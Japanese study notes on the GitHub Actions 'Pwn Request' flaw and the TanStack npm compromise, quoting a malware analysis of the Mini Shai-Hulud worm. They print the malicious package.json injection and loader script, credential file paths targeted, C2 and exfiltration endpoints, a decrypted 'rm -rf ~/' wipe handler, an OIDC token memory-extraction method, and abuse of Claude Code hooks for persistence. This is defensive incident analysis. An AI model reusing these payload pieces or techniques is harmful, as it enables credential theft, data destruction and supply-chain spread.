# Pwn Requestパターン

pull_request_targetにおける注意しなければならないパターンとしてPwn Requestパターンが存在する

## TanStackの侵害例を元にPwn Requestパターンについて学習する

[Pwn Requestパターン：TanStackポストモーテム](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem)

*TacStack npm パッケージ侵害概要*
セキュリティ事案：
2026/5/11 19:26の期間に、pull_request_targetのPwn Requestパターンによってfork↔base信頼境界を越えたGitHub Actionsキャッシュの汚染、GitHub ActionsのプロセスにおいてOICDトークンのランタイムメモリを抽出する事で、悪意あるバージョンを公開する事に成功している

npmトークンの摂取には至っていない

発見：
stepsecurityの外部研究者ashishkurmiによって20分いないに検出

影響範囲：
悪意のあるバージョンが公開されている場合に、インストール端末が対象
- AWS
- GCP
- Kubernetes
- Vault
- GitHub
- npm
- およびSSH
これらの認証情報が侵害されている事が予想される

そのため、これらの認証情報をローションする事が必要
↑
ローテーションする事が有効だと思われていたが、ローテーションする事でrm rfコマンドが実行される可能性もあり、、、

マルウェアの実態：
該当アクション
- npm install
- pnpm install
- yarn install
これらを実行した時に

悪意のあるパッケージのpackage.jsonにoptionalDependenciesがtrueになっている事でlifecycle scriptが実行される準備がされる。
lifecycle scriptでは、難読化されたrouter_init.jsが事項される

router_init.jsの処理内容
↓
```plain text
AWS IMDS
Secrets Manager
GCP メタデータ
Kubernetes サービスアカウントトークン
Vault トークン
~/.npmrc
GitHub トークン (env、gh CLI、.git-credentials )
SSH 秘密鍵
↑
一般的な場所から認証情報を収集

収集したデータをSession/Oxen messenger file-upload network システム(filev2.getsession.org, seed{1,2,3}.getsession.org)で暗号化しエンドツーエンドで通信を行う
↑
これに関してはドメインブロックがネットワーク対策になる

registry.npmjs.org/-/v1/search?text=maintainer:<user>を介して被害者が管理する他のパッケージを列挙し、同じインジェクションを使用してそれらを再公開、ようは、自己増殖する。
```

*タイムライン*
時刻はすべてUTCです。ローカルタイムスタンプはGitHub APIおよびnpmレジストリから取得

**攻撃前段階（キャッシュポイズニング段階）**
- 2026年5月10日 17:16
攻撃者は、 github.com/zblgg/ configuration というフォークを作成します（これは TanStack/router のフォークであり、フォークリスト検索を回避するために意図的に名前が変更されています）。
- 2026年5月10日 23:29
偽の身元claude <claude@users.noreply.github.com>によってフォーク上で作成された悪意のあるコミット65bf499d16a5e8d25ba95d69ec9790a6dd4a1f14。packages /history/vite_setup.mjs (約 30,000 行のバンドルされた JS ペイロード)が追加されています。コミット メッセージには[skip ci]というプレフィックスが付けられており、プッシュ イベントでの CI を抑制します。
- 2026年5月11日 10:49
zblggによるTanStack/router#mainに対する PR #7378 が「WIP: 履歴ビルドの簡素化」というタイトルで開設されました。
- 2026年5月11日 10:49
bundle-size.ymlとlabeler.yml（どちらもpull_request_targetを使用）はプルリクエストに対して自動実行されます。pull_request_targetがそのゲートをバイパスするため、初回貢献者承認は不要です。pr.yml（ pull_requestを使用）は実行されず、承認待ちでブロックされますが、承認は得られませんでした。
- 2026年5月11日 11:01～11:11
zblggによるPRヘッドへの複数回の強制プッシュにより、それぞれがプルリクエストターゲットの実行をさらにトリガーする。
- 2026年5月11日 11:11
強制プッシュにより、 65bf499d (悪意のあるコミット) が PR の先頭にマージされます。bundle -size.ymlのbenchmark-pr ジョブはrefs/pull/7378/mergeをチェックアウトし、pnpm install + pnpm nx run @benchmarks/bundle-size:build を実行します。これにより、vite_setup.mjsが実行されます。
- 2026年5月11日 11:29
キャッシュエントリLinux-pnpm-store-6f9233a50def742c09fde54f56553d6b449a535adf87d4083690539f49ae4da11 (1.1 GB) がTanStack/routerの GitHub Actions キャッシュに保存されました。スコープはrefs/heads/mainです。キーは、次に main にプッシュしたときにrelease.yml が参照する内容と一致するように設定されています。
- 2026年5月11日 11:31
攻撃者はプルリクエストを現在のメインHEAD（ b1c061af ）に強制的にプッシュバックし、可視プルリクエストを0ファイルのみの何もしない状態にします。プルリクエストは閉じられ、ブランチは同時に削除されます。キャッシュポイズニングは継続します。

**爆発（公開フェーズ）**
- 2026年5月11日 19:15
Manuel が PR #7369 (Shkumbin のCSS.supports修正) をマージ → メインにプッシュするとrelease.yml がトリガーされます。
ワークフロー実行25613093674が開始され (19:15:44)、失敗します。
- 2026年5月11日 19:20:39
npm レジストリは、@tanstack/history@1.161.9と 41 個の兄弟パッケージ (42 パッケージにわたる約 84 バージョン、ただしこの瞬間に表示されるのはその約半分のみ。残りは実行 #2 で取得) の公開を受け取ります。公開はTanStack/router release.yml@refs/heads/mainの OIDC trusted-publisher バインディングを介して認証されますが、テストが失敗したためスキップされたワークフローの定義済みパッケージ公開ステップからではありません。これは、テスト/クリーンアップ フェーズ中に実行されているマルウェアから取得され、ワー​​クフローのid-token: write permission を介して OIDC トークンを生成し、 registry.npmjs.orgに直接 POST します。
- 2026年5月11日 19:20:47
実行25613093674が完了しました（ステータス：失敗）
- 2026年5月11日 19:16
Manuel が PR #7382 (jiti tsconfig パスの修正) をマージ → メインへの 2 回目のプッシュでrelease.yml がトリガーされる
- 2026年5月11日 19:16:22
ワークフロー実行25691781302が開始されます。同じ汚染されたキャッシュが復元されました。
- 2026年5月11日 19:26:14
npmレジストリは、パッケージごとに2番目のバージョンセット（@tanstack/history@1.161.12など）の公開を受け取ります。同じOIDCメカニズム
2026年5月11日 19:26:20
- 実行25691781302が完了しました（ステータス：失敗）

**検出と対応**
- 2026年5月11日 19:50頃
StepSecurityに勤務する外部研究者ashishkurmiは、悪意のあるoptionalDependenciesのフィンガープリントとパッケージリスト（当初は42個中14個）の詳細な説明を添えて、問題番号7383を起票しました。
- 2026年5月11日 19:50頃
研究者がnpmセキュリティに直接通知
- 2026年5月11日 午後8時頃
マヌエルが#7383で認める - インシデント対応開始
- 2026年5月11日 20:10頃
ユーザーのマシンが侵害された場合、マヌエルはGitHub上の他のすべてのチームプッシュ権限を削除します。
- 2026年5月11日 20:30頃
Tannerは、完全なIOCリストとレジストリ側でtarballをプルするよう依頼するメールをsecurity@npmjs.comに送信します。正式なマルウェア報告はnpm経由で提出されます。
- 2026年5月11日 午後9時頃
@tanstack/*パッケージ295 個すべてを包括的にスキャンした結果、対象範囲は 42 パッケージ、84 バージョンであることが確認されました。Tannerは、影響を受ける 84 パッケージすべてについて npm の非推奨化プロセスを開始します。
@tan_stack およびメンテナーによる Twitter/X/LinkedIn/Bluesky での公開情報開示
- 2026年5月11日 21:30
調査の結果、 bundle-size.yml のpull_request_targetキャッシュポイズニングベクトルとzblgg/configurationフォークが特定されました。
すべてのTanStack/* GitHubリポジトリのキャッシュエントリはAPI経由で削除されました。
セキュリティ強化のためのプルリクエストがマージされました：bundle-size.ymlの構造変更、repository_ownerガードの追加、サードパーティアクション参照のSHAへの固定。
公式GitHubセキュリティアドバイザリが公開され、CVEが要求されました。

*これらの侵害が起きた3つの原因：脆弱性*

1. pull_request_targetの"Pwn Request"パターン

権限者の意図：信頼(permition)の分割
comment-prとbenchmark-prにおいて、benchmark-prをread-onlyの権限しか持たないジョブとして定義するという意図がコメントからあります。
```JSON
"optionalDependencies": {
  "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
}
```
``` yaml
on:
  pull_request_target:
    paths: ['packages/**', 'benchmarks/**']

jobs:
  benchmark-pr:
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge # fork's merged code

      - uses: TanStack/config/.github/setup@main # transitively calls actions/cache@v5

      - run: pnpm nx run @benchmarks/bundle-size:build # executes fork-controlled code
```
もしも、正しく信頼の分割が行えていればOKだったが、下記2点が考慮漏れしていた。
1. actions/cache@v5のジョブ後の保存は権限によって制限されず、キャッシュ書き込みには、ワークフローGITHUB_TOKENではなく、ランナー内部のトークンが使用されるため、read権限を設定したとしてもキャッシュの書き込みを制限する事はできない。
2. キャッシュスコープはリポジトリごとに設定され、pull_request_targetの実行（ベースリポジトリのキャッシュスコープを使用）とmainへのプッシュで共有されます。ベースリポジトリのキャッシュスコープで実行されるプルリクエストは、main上の本番ワークフローで後で復元されるエントリを汚染する可能性があります。

2. GitHub Actionsの信頼境界を越えたキャッシュポイズニング

vite_setup.mjsがrelease.ymlワークフローが実行されて、Linux-pnpm-store-${hashFiles('**/pnpm-lock.yaml')}の下にデータを pnpm-store ディレクトリに書き込むように特別に設計されていた。

benchmark -prジョブが終了すると、actions/cache@v5の post ステップが (汚染された) pnpm store をまさにそのキーに保存しました。次にrelease.yml がmain へのプッシュで実行されたとき、Setup Tools ステップが汚染されたエントリを復元しました。
↑
このキャッシュポイズニングは2024年にAdnan Khan氏によって報告されている注意が必要な攻撃手法だった

3. ランナーメモリからのOIDCトークンの抽出

release.yml ではid-token: writeが宣言されています(npm OIDC の信頼できる公開に正当に必要です)。ランナー上で汚染された pnpm ストアが復元されると、攻撃者が制御するバイナリがディスク上に存在し、ビルド ステップ中に呼び出されます。それらのバイナリは次のとおりです。

/proc/*/cmdlineを介してGitHub Actions Runner.Workerプロセスを探します。
ワーカーのメモリをダンプするには、/proc/<pid>/mapsと/proc/<pid>/memを読み込んでください。
OIDCトークンを抽出する（ id-token: writeが設定されている場合、ランナーはメモリ上に遅延的にトークンを生成する）。
トークンを使用して、POSTリクエストをregistry.npmjs.orgに直接認証することで、ワークフローの「パッケージの公開」ステップを完全にスキップできます。
これは、2025年3月に発生したtj-actions/changed-filesの侵害で使用されたものと同じメモリ抽出手法（および出典コメント付きのPythonスクリプト）です。攻撃者は新たな攻撃手法を考案したのではなく、既に発表されている研究成果を再構成したのです。

*これらの侵害を実際に受けてしまった場合に取るべき対応：GMO Flatt Security*
[Mini shai-hulud 第2波](https://blog.flatt.tech/entry/mini_shai_hulud_2nd)
初期対応：
影響を受けたバージョンをインストールしている場合は、クレデンシャルのローテーションより先に、永続化機構の無効化を行う必要があります。
感染端末では永続化サービス gh-token-monitor が動作し、GitHub トークンの有効性を監視し、失効時に rm -rf ~/ を実行します。
npm トークンについても description に IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner（脅迫メッセージ）が設定されますが、検体から確認できたモニタは GitHub トークンのみを監視する実装です。npm トークン側に同様のモニタが存在するかは未確認のため、同様に永続化除去を先行してください。

永続化機構の停止と除去（最優先）
macOS の場合、~/Library/LaunchAgents/com.user.gh-token-monitor.plist を launchctl unload してから削除
Linux の場合、systemctl --user stop gh-token-monitor && systemctl --user disable gh-token-monitor を実行し、~/.config/systemd/user/gh-token-monitor.service を削除
.claude/settings.json、.claude/setup.mjs、.claude/router_runtime.js、.vscode/tasks.json、.vscode/setup.mjs を削除
.github/workflows/codeql_analysis.yml が攻撃者によって追加されていないか確認し、該当すれば削除
安全なバージョンへの移行（各パッケージの直前直後の正規版にアップグレード/ダウングレード）
クレデンシャルのローテーション（永続化の除去を確認した上で実施。漏洩可能性のあるクレデンシャルがある場合は、その影響がありうるクラウドリソースの監査ログも確認）
自 GitHub アカウント下に {dune_word}-{dune_word}-{3桁} 命名パターンの見知らぬリポジトリが作成されていないか、またその description に A Mini Shai-Hulud has Appeared を含むものがないか確認
各リポジトリで、未知のブランチや .github/workflows/ 配下の新規ファイルがないか確認

侵害手順侵害の仕組み
第一波の Stage 1〜5（前回記事参照）と関連付けながら、第二波の攻撃チェーンを記述します。第二波のペイロードは第一波と同じ Mini Shai-Hulud ファミリに属しますが、初期侵入経路・データ持ち出し・永続化手法・規模のいずれも大幅に進化しています。

第一波 (4/29-30)	第二波 (5/12)
侵害パッケージ数	6	200超（集計中）
対象エコシステム	npm + PyPI	npm
主要被害者	SAP CAP, Intercom, PyTorch Lightning	TanStack, UiPath, Mistral AI, DraftLab 等
初期侵入	窃取済み npm トークンを利用と見られる	CI/CD パイプラインの侵害
データの持ち出し先	GitHub リポジトリ + 攻撃者サーバ	GitHub リポジトリ + C2 + Session Protocol（E2E 暗号化）
永続化	IDE フック・GitHub Action ワークフロー	IDE フック・GitHub Action ワークフロー + OS レベル（LaunchAgent / systemd）
Stage 1: マルウェアの起動
第一波では package.json の preinstall フックに node setup.mjs を挿入していましたが、第二波では optionalDependencies を利用した注入方式に変わっています。

ワームに感染したパッケージ（悪性バージョン）の package.json には、以下が追加されています。

{
  "optionalDependencies": {
    "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
  }
}
これは攻撃者の fork（voicproducoes/router、GitHub ID 269549300）内の orphan commit を参照しています。この @tanstack/setup パッケージの prepare スクリプトでローダが実行されます。

{
  "prepare": "bun run tanstack_runner.js && exit 1"
}
末尾の exit 1 は、optionalDependencies であるため graceful に失敗を装い、インストール自体はエラーにならずに続行させる仕組みです。&& により tanstack_runner.js が正常終了した場合にのみ exit 1 が実行されます。

@tanstack/setup パッケージは bun npm パッケージ（@oven/bun-linux-x64 等）を依存関係に持っており、npm のインストール過程で Bun ランタイムが先にインストールされます（node install.js）。その後 prepare スクリプトで tanstack_runner.js が Bun で実行されます。

tanstack_runner.js は第一波の setup.mjs と同様のローダで、次なるマルウェアコード router_init.js（約 2.3 MB）を実行します。router_init.js は @tanstack/react-router のパッケージ自体に同梱されています。

Stage 2: 悪性コード本体の取得
第二波のプライマリペイロードは router_init.js で、約 2.3 MB の単一行難読化 JavaScript です（第一波の execution.js / router_runtime.js は約 11〜12 MB）。これにより、正規パッケージの tarball は約 190 KB ですが、悪性版は約 905 KB に膨らんでいます（4.7 倍）。

第一波の execution.js / router_runtime.js（11〜12 MB）と比較して router_init.js（2.3 MB）は大幅に小型化されており、tarball のサイズ異常を目立たなくする工夫と考えられます。また、検体の静的解析のみで、（我々 GMO Flatt Security や Socket、Aikido のようなセキュリティ企業に）マルウェアとしてフラグされるのを回避するためであるとも予想されます。

なお、ここで取得されるファイルには、いいくつかの難読化が施されています。第一波の execution.js / router_runtime.js も難読化されていましたが、第二波では PBKDF2 の反復回数増加（200,000 回）や多層 AES-GCM ペイロードなど、解析耐性が強化されています。（おかげさまで、我々も解析にちょっと手間取りました。）

Stage 3: クレデンシャルの探索
ファイルベースの収集対象は第一波とほぼ共通で、100 以上のパスパターンに対してファイル収集を試みます（基本的なパスリストは第一波記事の Stage 2 を参照）。

ただし、第二波ではファイル収集に加え、クラウド API への能動的なアクセスが追加されており、ファイルとして保存されていないシークレットも窃取対象に含まれます。

静的解析、及び実行トレースから確認された探索対象は以下の通りです（※ 本稿執筆時点で解析は進行中で、不完全な可能性があります）。

ファイルベースのクレデンシャル収集（カテゴリ別）:

カテゴリ	主な対象パス
AWS	~/.aws/credentials, ~/.aws/config
GCP	~/.config/gcloud/application_default_credentials.json
Azure	~/.azure/accessTokens.json
Kubernetes	~/.kube/config, /var/run/secrets/kubernetes.io/serviceaccount/namespace
HashiCorp Vault	~/.vault-token, /run/secrets/vault_token
Docker	~/.docker/config.json
SSH	~/.ssh/id_rsa, ~/.ssh/id_ed25519
Git	~/.gitconfig, ~/.git-credentials, ~/.netrc
npm	~/.npmrc
暗号資産ウォレット	~/.electrum/wallets, ~/.electrum-ltc/wallets, ~/.ethereum/keystore, ~/.monero, ~/.config/Exodus/exodus.wallet, Ledger Live, Atomic Wallet
メッセージングアプリ	Telegram (~/.config/telegram-desktop, ~/.local/share/TelegramDesktop/tdata), Signal, Discord (Local Storage/leveldb), Element (Matrix)
デスクトップ環境	KWallet (~/.config/kwalletd), GNOME Keyring (~/.local/share/keyrings), NSS DB (~/.pki/nssdb)
リモートデスクトップ	Remmina (~/.config/remmina), OpenVPN (~/.cert/nm-openvpn)
その他	Ansible (~/.ansible), Helm (~/.config/helm), Docker containers (/var/lib/docker/containers)
GitHub CLI トークンの窃取:

ペイロード実行直後に gh auth token コマンドが実行され、GitHub CLI のローカル認証トークンの取得が試みられます。

クラウド API への能動的アクセス（第二波固有）:

第一波ではファイルベースの収集のみでしたが、第二波のペイロードはクラウドプロバイダの API に直接アクセスし、ファイルに保存されていないシークレットの窃取を試みます。実行トレースでは以下のアクセスが観測されました。

サービス	内容
AWS STS (sts.us-east-1.amazonaws.com)	窃取した AWS クレデンシャルの有効性検証
AWS SSM Parameter Store	17 リージョン（us-east-1, us-east-2, us-west-1, us-west-2, ap-northeast-1〜3, ap-south-1, ap-southeast-1〜2, ca-central-1, eu-central-1, eu-north-1, eu-west-1〜3, sa-east-1）の Parameter Store に対してシークレットの取得を試行
AWS Secrets Manager	同上 17 リージョンの Secrets Manager に対してシークレットの取得を試行（各リージョンに対して複数 IP でのフォールバック接続あり）
HashiCorp Vault	127.0.0.1:8200 へのローカル Vault インスタンスのプローブ
AWS/GCP メタデータサービス	169.254.169.254（IMDS）への認証情報の取得、169.254.170.2（ECS タスクメタデータ）へのアクセス
Stage 4: 攻撃者サーバへのデータの持ち出し
第一波では GitHub パブリックリポジトリへの持ち出しがプライマリでしたが、第二波では 3 つの独立した持ち出しチャネルが実装されています。検体の解析から判明したオーケストレータ関数 wj() の構造を以下に示します。

wj() — Exfil オーケストレータ
│
├─ 1. クレデンシャル収集の完了を待機
├─ 2. 収集結果（envelope 配列）を取得
│
├─ 3. 3 つの sender を並列に初期化
│   ├─ A6 (DomainSender)  : https://git-tanstack[.]com/router  ← プライマリ C2
│   ├─ DV (SessionSender) : Session Protocol 経由               ← 常時並走
│   └─ $6 (GitHubSender)  : api.github.com GraphQL              ← フォールバック
│
├─ 4. A6 の健全性チェック (healthy())
│   └─ A6 が応答しない場合のみ、$6 (GitHub exfil) をアクティブ化
│
├─ 5. gK (Dispatcher) が全 sender に envelope を分配・送信
│   └─ フラッシュ閾値 100 KB 単位でバッファリング
│
├─ 6. envelope 内に GitHub トークンがあれば tq (CI workflow injector) を実行
│   └─ ghs_old / ghs_jwt トークンで既存リポジトリにワークフロー注入
│
└─ 7. finalize → process.exit(0)
つまり、git-tanstack[.]com がプライマリ C2、Session Protocol が常時並走する第 2 経路、GitHub リポジトリへの持ち出しは git-tanstack[.]com が応答しない場合のフォールバックという優先順位です。第一波で GitHub がプライマリだった構成から大きく変化しています。

C2 ドメインへの持ち出し（プライマリ）
プライマリのデータ持ち出し先は攻撃者が管理する C2 ドメイン git-tanstack[.]com です。TanStack 公式のドメインを模倣した偽装ドメインで、HTTPS（ポート 443）で接続されます。

項目	値
Exfil URL	https://git-tanstack[.]com:443/router
プロトコル	HTTPS POST
優先度	プライマリ（最初に健全性チェックが行われ、応答があれば優先使用）
なお、codeql_analysis.yml の sv バリアントでは api[.]masscan[.]cloud/v2/upload への POST も確認されています。

Session Protocol を経由した持ち出し（常時並走）
窃取データは RSA-4096-OAEP + AES-256-GCM のハイブリッド暗号で暗号化された上で、Session メッセージングプロトコルの open-group file API に送信されます。この経路は C2 の可用性に関わらず常時並走します。

項目	値
Exfil URL	http://filev2.getsession.org/file/{id}
Seed nodes	seed1.getsession.org, seed2.getsession.org, seed3.getsession.org
受信者 Session ID	05f9e609d79eed391015e11380dee4b5c9ead0b6e2e7f0134e6e51767a87323026
TLS ピン証明書	CN=seed1.getsession.org、発行者 Oxen Privacy Tech Foundation（メルボルン、有効期限 2033 年）
Session Protocol はエンドツーエンド暗号化のメッセージングインフラであり、通信経路の解析や取得データの復号が困難です。第一波よりも検出・対応が難しくなっています。（とはいえ業務端末などでは、これを用いる機会は稀でしょうから、ホストごとブロックして構わないのではないかと思います。）

GitHub への持ち出し（フォールバック）
C2 ドメイン（git-tanstack[.]com）が応答しない場合は、フォールバックとして、第一波と同様に GitHub GraphQL API による持ち出しが行われます。被害者のアカウント上に新規パブリックリポジトリを作成し、createCommitOnBranch mutation で窃取データを commit します。

項目	値
リポジトリ命名	{dune_word}-{dune_word}-{0〜999}（30 個の Dune 用語から生成）
リポジトリ設定	private: false, auto_init: true, has_discussions/issues/wiki: false
Commit message headline	chore: update dependencies
Commit body	Co-authored-by: {name} <claude@users.noreply.github.com>
大容量データ	30 MB チャンク単位で base64 エンコード、data/{timestamp}-{counter}.json として commit
GraphQL バッチ	alias b0, b1... で createCommitOnBranch mutation をチャンクサイズ 2 で発行
Stage 5: 感染端末・GitHub での永続化
第一波の永続化手法（.claude/settings.json / .vscode/tasks.json の交差構造）に加え、第二波では OS レベルのサービス登録が追加されています。

永続化先とその内容の一覧
永続化手法	パス	第一波	第二波
Claude Code SessionStart フック	.claude/settings.json	あり	あり
VSCode folderOpen タスク	.vscode/tasks.json	あり	あり
ローダ / ペイロードのコピー	.claude/setup.mjs, .vscode/setup.mjs 等	あり	あり
macOS LaunchAgent	~/Library/LaunchAgents/com.user.gh-token-monitor.plist	なし	あり
Linux systemd user service	~/.config/systemd/user/gh-token-monitor.service	なし	あり
GitHub Actions ワークフロー	.github/workflows/codeql_analysis.yml	format-check.yml（mbt のみ）	codeql_analysis.yml
特徴: GitHub トークン無効化時に rm -rf ~/
前述のうち、gh-token-monitor 系は、60 秒ごとに https://api.github.com/user へ Bearer 認証をリクエストし、GitHub トークンの有効性を監視します。HTTP 40x（トークン失効）を検知すると、保存されたハンドラを eval で即座に実行します。24 時間の TTL が設定されており、未検知のまま経過すると自動終了します。

実際に eval で実行されるスクリプトを、検体からハンドラの中身を復号した結果は以下の通りです。

rm -rf ~/
つまり、ホームディレクトリの全消去です。 被害者がインシデント対応としてトークンを revoke した瞬間に rm -rf ~/ が発動するトラップとなります。対応時は、クレデンシャルのローテーションに先立ち、必ず gh-token-monitor サービスの停止と除去を行う必要があります（手順は対応指針を参照）。

gh-token-monitor の中核となるコード辺（検体内より復号・引用）。HANDLERが実際の感染時は rm -rf ~/ となる。
Stage 6: 他の npm パッケージへのマルウェア植え付け
ワーム拡散の基本フローは第一波と共通ですが、トークン取得経路と OIDC 交換の利用が拡張されています。

トークン検出: 窃取した npm トークンの中から bypass_2fa: true 属性を持つものを選別
パッケージ列挙:https://registry.npmjs.org/-/v1/search?text=maintainer:{username}&size=250 で被害者が publish 可能なパッケージを列挙
tarball 改竄: 各パッケージの最新 tarball をダウンロードし、router_init.js（2.3 MB）と optionalDependencies を注入した package.json を差し替え
OIDC トークン交換（CI/CD 環境の場合）: GitHub OIDC トークンを https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/{pkg} で npm publish トークンに交換
publish: 改竄済み tarball を npm registry に PUT。正規の CI/CD パイプラインを経由しているため、有効な SLSA provenance が付与される
この拡散メカニズムにより、TanStack の CI/CD 侵害を起点として、TanStack メンテナ（または TanStack パッケージをインストールした開発者）が publish 権限を持つ他パッケージへ連鎖的に感染が広がっています。UiPath（66 パッケージ）、Mistral AI、DraftLab 等への感染は、このワーム的自己拡散の結果と見られています。各非 TanStack パッケージの個別の侵害タイムラインは、本稿執筆時点で確定していません。

なお、第一波にはなかった脅迫的要素として、作成された npm トークンの description に以下が設定されています。

IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner
上述の Stage 5 で解析した通り、Github 側に対しては、実際に感染端末内のデータを削除する仕組みが確認されています。npm 側トークンの失効によって駆動される仕組みは、筆者は未だ明確には確認できていない（攻撃者はそのようなワイプの仕組みを持たない）ものの、単なるブラフと受け取りにくい状況ではあります。

